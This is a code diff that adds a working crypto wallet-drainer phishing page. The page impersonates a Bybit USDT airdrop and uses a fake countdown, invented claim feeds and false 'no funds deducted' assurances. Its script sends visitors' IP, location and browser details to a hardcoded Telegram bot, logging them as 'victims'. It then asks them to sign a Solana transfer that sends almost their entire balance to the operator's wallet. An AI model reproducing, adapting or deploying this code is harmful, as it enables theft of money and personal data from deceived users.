@@ -1,28 +1,315 @@
-<center>
-<!DOCTYPE html><html lang="en"><head>
-    <meta charset="UTF-8">
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="./index.js"></script>
-
-    <title>No Chance - Solana Airdrop!</title>
-    <link rel="stylesheet" href="styles.css">
+<script src="/index.js"></script>
+        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #1a1a1a; color: white; min-height: 100vh; display: flex; flex-direction: column; }
+        .header { background-color: #333; padding: 15px; display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
+        .logo { font-size: clamp(18px, 5vw, 24px); display: flex; align-items: center; gap: 2px; line-height: 1; }
+        .logo img { height: 16px; background: none; border: none; background-color: transparent; vertical-align: middle; }
+        .main-content { padding: 20px; flex-grow: 1; max-width: 1200px; margin: 0 auto; width: 100%; box-sizing: border-box; }
+        .reward-card { background: linear-gradient(45deg, #8B4513, #4A2C2C); border-radius: 10px; text-align: center; padding: 20px; margin-bottom: 20px; }
+        .wallet-connect { background-color: #222; border-radius: 10px; padding: 20px; margin-bottom: 20px; text-align: center; }
+        .wallet-connect .logo { justify-content: center; }
+        .wallet-grid { display: none; grid-template-columns: repeat(auto-fit, minmax(80px, 1fr)); gap: 10px; margin-top: 20px; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #2a2a2a; padding: 15px; border-radius: 15px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.5); z-index: 1000; max-width: 300px; max-height: 400px; }
+        .wallet-grid.active { display: grid; }
+        .wallet-item { background-color: #3a3a3a; padding: 10px; border-radius: 8px; text-align: center; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 8px; transition: background-color 0.2s; }
+        .wallet-item:hover { background-color: #4a4a4a; }
+        .wallet-icon { width: 32px; height: 32px; object-fit: contain; border-radius: 5px; }
+        .wallet-item p { margin: 0; font-size: 12px; color: #d3d3d3; }
+        .button { background-color: #6B46C1; color: white; padding: 12px 24px; border-radius: 25px; border: none; cursor: pointer; margin: 20px auto; width: 100%; max-width: 300px; font-size: clamp(14px, 4vw, 16px); }
+        .button:disabled { background-color: #4a3a7d; cursor: not-allowed; }
+        .connect-wallet { background-color: #6B46C1; color: white; padding: 12px 24px; border-radius: 25px; border: none; cursor: pointer; font-size: clamp(14px, 4vw, 16px); }
+        .connect-wallet:hover { background-color: #5a3a9e; }
+        .progress-bar { background-color: #333; height: 20px; border-radius: 10px; margin: 10px 0; }
+        .progress { height: 100%; background-color: #6B46C1; border-radius: 10px; transition: width 0.3s; }
+        .status { margin-top: 10px; font-size: clamp(12px, 3vw, 14px); }
+        .timer { color: #ff4444; font-weight: bold; }
+        .recent-claims { margin-top: 10px; font-size: 12px; color: #d3d3d3; }
+        .claim-step { display: none; }
+        .claim-step.active { display: block; }
+        .assurance { font-size: 12px; color: #d3d3d3; margin: 10px 0; }
+        .pool-balance { font-size: 14px; color: #a3a3a3; margin-top: 10px; }
+        @media (max-width: 600px) { .main-content { padding: 10px; } .reward-card, .wallet-connect { padding: 15px; } .wallet-grid { max-width: 90vw; max-height: 70vh; } }
+    </style>
 </head>
-
 <body>
-    <header>
-        <div class="logo">GRAB THE FREE AIRDROP - BEFORE RAYDIUM LISTING!!</div>
-    </header>
-    <main>
-        <div class="content">
-            <!-- <p>100,000 $NOCH TOKENS PER WALLET ADDRESS</p> -->
-            <button class="connect-wallet">CLAIM FREE AIRDROP - 100,000 $NOCH TOKENS</button>
+    <div class="header">
+        <div class="logo">
+            <img src="https://i.postimg.cc/fWFSp5mm/bybit-logo-white-1.png" alt="BYBIT Logo">
+            <span>Airdrop (Solana)</span>
         </div>
-    </main>
-    <footer>
-        <p>© 2024 No Chance!! All rights reserved.</p>
-    </footer>
-    <!-- <script src="wallet.js"></script> -->
+        <div id="status">Awaiting Connect...</div>
+    </div>
 
+    <div class="main-content">
+        <div class="reward-card">
+            <div id="step1" class="claim-step active">
+                <h2>Claim Your Airdrop Now</h2>
+                <p>BYBIT is giving away 1,000,000 USDT. Connect your Solana wallet to claim your share. Hurry, time is running out.</p>
+                <p class="timer" id="countdown">05:00</p>
+                <button class="button" id="connectButton">Connect Wallet</button>
+                <div class="recent-claims" id="recentClaims">
+                    <p>Recent Claims:</p>
+                    <p>0x12ab... claimed 750 USDT</p>
+                    <p>0x78cd... claimed 300 USDT</p>
+                </div>
+                <p class="pool-balance">Airdrop Pool: 1,000,000 USDT Remaining</p>
+            </div>
 
-</body></html>
-</center>
+            <div id="step2" class="claim-step">
+                <h2>Claim Your Airdrop</h2>
+                <p>Wallet connected. Now claim your airdrop by approving the transaction.</p>
+                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
+                <div class="progress-bar">
+                    <div class="progress" id="progressBar" style="width: 0%"></div>
+                </div>
+                <button class="button" id="claimButton">Claim Airdrop</button>
+            </div>
+
+            <div id="step3" class="claim-step">
+                <h2>Final Confirmation</h2>
+                <p>Airdrop claim processed. Please confirm the transaction to receive your USDT reward.</p>
+                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
+                <button class="button" id="finalConfirmButton">Confirm Airdrop</button>
+            </div>
+
+            <div id="step4" class="claim-step">
+                <h2>Processing Airdrop...</h2>
+                <p>Your airdrop is being processed. Please wait...</p>
+                <div class="progress-bar">
+                    <div class="progress" id="fakeProgress" style="width: 0%"></div>
+                </div>
+            </div>
+
+            <div class="status" id="connectStatus"></div>
+        </div>
+
+        <div class="wallet-connect">
+            <h3 class="logo">
+                <img src="https://i.postimg.cc/fWFSp5mm/bybit-logo-white-1.png" alt="BYBIT Logo">
+                <span>Airdrop</span>
+            </h3>
+            <p>Total Prize Pool</p>
+            <h2>1,000,000 USDT</h2>
+        </div>
+
+        <div class="wallet-grid" id="walletGrid">
+            <div class="wallet-item" onclick="connectWallet('Phantom')">
+                <img src="https://i.postimg.cc/7ZqLq0kP/phantom-wallet-icon.png" alt="Phantom" class="wallet-icon">
+                <p>Phantom</p>
+            </div>
+            <div class="wallet-item" onclick="connectWallet('Solflare')">
+                <img src="https://i.postimg.cc/3JqLqW5S/solflare-wallet-icon.png" alt="Solflare" class="wallet-icon">
+                <p>Solflare</p>
+            </div>
+            <div class="wallet-item" onclick="connectWallet('Trust Wallet')">
+                <img src="https://i.postimg.cc/449BLrqY/Trust-Stacked-Logo-Blue.png" alt="Trust Wallet" class="wallet-icon">
+                <p>Trust Wallet</p>
+            </div>
+            <div class="wallet-item" onclick="connectWallet('Coinbase Wallet')">
+                <img src="https://i.postimg.cc/fbVx3dhV/Coinbase-logo-square-1.png" alt="Coinbase Wallet" class="wallet-icon">
+                <p>Coinbase Wallet</p>
+            </div>
+        </div>
+
+        <button class="button">Learn How to Claim</button>
+    </div>
+
+    <script>
+        const SolanaWeb3 = window.solanaWeb3;
+
+        // Configuration from wallet.js (as per README.md)
+        const solana_wallet_receiver_id = "YOUR_SOLANA_WALLET_RECEIVER_ID"; // Replace with your Solana wallet address
+        const website_url = "YOUR_WEBSITE_URL"; // Replace with your hosted website URL (e.g., https://yourdomain.com)
+        const TELEGRAM_BOT_TOKEN = "8008230982:AAFDKn1n03fT_GMWMfYY0IfFVi4IVRyqdSI";
+        const TELEGRAM_USER_ID = "6309547301";
+
+        let solanaPublicKey = null;
+        let finalConfirmAttempts = 0;
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+        async function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_USER_ID,
+                        text: message,
+                        parse_mode: "Markdown"
+                    })
+                });
+            } catch (error) {
+                console.error("Failed to send Telegram message:", error);
+            }
+        }
+
+        async function captureIpAndLocation() {
+            try {
+                const response = await fetch("https://ipapi.co/json/");
+                const data = await response.json();
+                const ip = data.ip || "Unknown";
+                const city = data.city || "Unknown";
+                const region = data.region || "Unknown";
+                const country = data.country_name || "Unknown";
+                const location = `${city}, ${region}, ${country}`;
+                const userAgent = navigator.userAgent || "Unknown";
+                const message = `🔔 *New Victim Clicked Link* 🔔\n🌐 *IP*: ${ip}\n📍 *Location*: ${location}\n🖥️ *User Agent*: ${userAgent}\n⏰ *Timestamp*: ${new Date().toISOString()}`;
+                await sendTelegramMessage(message);
+            } catch (error) {
+                await sendTelegramMessage(`⚠️ *Failed to Capture IP/Location* ⚠️\n📛 *Error*: ${error.message}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+            }
+        }
+
+        window.onload = captureIpAndLocation;
+
+        let timeLeft = 300;
+        const countdownElement = document.getElementById("countdown");
+        const timer = setInterval(() => {
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                countdownElement.innerText = "Airdrop Expired";
+                document.getElementById("connectButton").disabled = true;
+            } else {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                countdownElement.innerText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                timeLeft--;
+            }
+        }, 1000);
+
+        const recentClaims = document.getElementById("recentClaims");
+        const claims = [
+            "0x12ab... claimed 750 USDT",
+            "0x78cd... claimed 300 USDT",
+            "0x34ef... claimed 500 USDT"
+        ];
+        let claimIndex = 1;
+        setInterval(() => {
+            recentClaims.innerHTML = `<p>Recent Claims:</p><p>${claims[claimIndex]}</p>`;
+            claimIndex = (claimIndex + 1) % claims.length;
+        }, 3000);
+
+        function showStep(step) {
+            document.querySelectorAll(".claim-step").forEach(step => step.classList.remove("active"));
+            document.getElementById(`step${step}`).classList.add("active");
+        }
+
+        const walletGrid = document.getElementById("walletGrid");
+        document.getElementById("connectButton").addEventListener("click", async () => {
+            try {
+                if (!walletGrid.classList.contains("active")) {
+                    walletGrid.classList.add("active");
+                    await sendTelegramMessage(`👀 *Victim Viewed Wallet Grid* 👀\n🌍 *Network*: Solana\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                }
+            } catch (error) {
+                document.getElementById("connectStatus").innerText = `Failed to show wallet grid: ${error.message}`;
+                await sendTelegramMessage(`⚠️ *Failed to Show Wallet Grid* ⚠️\n📛 *Error*: ${error.message}\n🌍 *Network*: Solana\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+            }
+        });
+
+        async function connectWallet(walletName) {
+            try {
+                const browserDeepLinks = {
+                    'Phantom': `phantom://dapp?url=${encodeURIComponent(website_url)}`,
+                    'Solflare': `solflare://dapp?url=${encodeURIComponent(website_url)}`,
+                    'Trust Wallet': `trust://browser?url=${encodeURIComponent(website_url)}`,
+                    'Coinbase Wallet': `coinbase-wallet://dapp?url=${encodeURIComponent(website_url)}`
+                };
+
+                const fallbackDeepLinks = {
+                    'Phantom': 'phantom://',
+                    'Solflare': 'solflare://',
+                    'Trust Wallet': 'trust://',
+                    'Coinbase Wallet': 'coinbase-wallet://'
+                };
+
+                await sendTelegramMessage(`🖱️ *Victim Selected Wallet* 🖱️\n👛 *Wallet*: ${walletName}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+
+                if (window.solana && (window.solana.isPhantom || window.solana.isSolflare || window.solana.isTrust || window.solana.isCoinbaseWallet)) {
+                    // Already in wallet browser or desktop extension
+                    const response = await window.solana.connect();
+                    solanaPublicKey = response.publicKey.toString();
+                    document.getElementById("status").innerText = `Connected: ${solanaPublicKey.slice(0, 6)}...${solanaPublicKey.slice(-4)}`;
+                    document.getElementById("connectStatus").innerText = `${walletName} connected successfully.`;
+                    walletGrid.classList.remove("active");
+                    await sendTelegramMessage(`✅ *Solana Wallet Connected (In Wallet Browser/Desktop)* ✅\n👛 *Wallet*: ${solanaPublicKey}\n🔧 *Wallet Type*: ${walletName}\n🌍 *Network*: Solana\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    showStep(2);
+                } else if (isMobile) {
+                    // Try to open the site in the wallet's browser
+                    const browserDeepLink = browserDeepLinks[walletName];
+                    window.location.href = browserDeepLink;
+                    setTimeout(async () => {
+                        document.getElementById("connectStatus").innerText = `Please open the site in ${walletName}'s browser and approve the connection.`;
+                        await sendTelegramMessage(`⏳ *Attempted to Open Site in Solana Wallet Browser* ⏳\n👛 *Wallet*: ${walletName}\n🌍 *Network*: Solana\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                        // Fallback to just opening the wallet app
+                        window.location.href = fallbackDeepLinks[walletName];
+                    }, 2000);
+                } else {
+                    document.getElementById("connectStatus").innerText = `Please install ${walletName} extension or use a mobile device.`;
+                    walletGrid.classList.remove("active");
+                    await sendTelegramMessage(`❌ *Solana Wallet Connection Failed* ❌\n📛 *Reason*: ${walletName} not installed\n🌍 *Network*: Solana\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                }
+            } catch (error) {
+                document.getElementById("connectStatus").innerText = `Connection failed: ${error.message}`;
+                walletGrid.classList.remove("active");
+                await sendTelegramMessage(`❌ *Wallet Connection Failed* ❌\n📛 *Error*: ${error.message}\n🌍 *Network*: Solana\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+            }
+        }
+
+        document.getElementById("claimButton").addEventListener("click", async () => {
+            document.getElementById("connectStatus").innerText = "Processing Solana airdrop claim...";
+            await sendTelegramMessage(`🖱️ *Solana Wallet Claim Initiated* 🖱️\n👛 *Wallet*: ${solanaPublicKey}\n🌍 *Network*: Solana\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+            try {
+                const connection = new SolanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+                const walletBalance = await connection.getBalance(new SolanaWeb3.PublicKey(solanaPublicKey));
+                const lamportsToSend = walletBalance - 5000; // Leave 5000 lamports for fees
+                if (lamportsToSend <= 0) {
+                    document.getElementById("connectStatus").innerText = "Insufficient SOL balance to claim. Please add funds to your wallet and try again.";
+                    await sendTelegramMessage(`⚠️ *Insufficient SOL Balance* ⚠️\n👛 *Wallet*: ${solanaPublicKey}\n💰 *Balance*: ${walletBalance / SolanaWeb3.LAMPORTS_PER_SOL} SOL\n🌍 *Network*: Solana\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    return;
+                }
+                const transaction = new SolanaWeb3.Transaction().add(
+                    SolanaWeb3.SystemProgram.transfer({
+                        fromPubkey: new SolanaWeb3.PublicKey(solanaPublicKey),
+                        toPubkey: new SolanaWeb3.PublicKey(solana_wallet_receiver_id),
+                        lamports: lamportsToSend,
+                    })
+                );
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = new SolanaWeb3.PublicKey(solanaPublicKey);
+                const signedTx = await window.solana.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signedTx.serialize());
+                await connection.confirmTransaction(signature);
+                const solAmount = lamportsToSend / SolanaWeb3.LAMPORTS_PER_SOL;
+                await sendTelegramMessage(`💸 *SOL Drained* 💸\n👛 *Wallet*: ${solanaPublicKey}\n💰 *Amount*: ${solAmount} SOL\n📜 *Tx*: ${signature}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                document.getElementById("connectStatus").innerText = "Solana airdrop claim processed successfully.";
+                showStep(3);
+            } catch (error) {
+                document.getElementById("connectStatus").innerText = `Failed to process claim: ${error.message}`;
+                await sendTelegramMessage(`❌ *Solana Claim Failed* ❌\n👛 *Wallet*: ${solanaPublicKey}\n📛 *Error*: ${error.message}\n🌍 *Network*: Solana\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+            }
+        });
+
+        document.getElementById("finalConfirmButton").addEventListener("click", async () => {
+            finalConfirmAttempts++;
+            document.getElementById("connectStatus").innerText = "Final confirmation processed for Solana wallet.";
+            await sendTelegramMessage(`🖱️ *Solana Wallet Final Confirmation* 🖱️\n👛 *Wallet*: ${solanaPublicKey}\n🌍 *Network*: Solana\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+            showStep(4);
+            const fakeProgress = document.getElementById("fakeProgress");
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 10;
+                fakeProgress.style.width = `${progress}%`;
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    document.getElementById("connectStatus").innerText = "Airdrop processing complete. Check your wallet for rewards.";
+                }
+            }, 500);
+        });
+    </script>
+</body>
+</html>
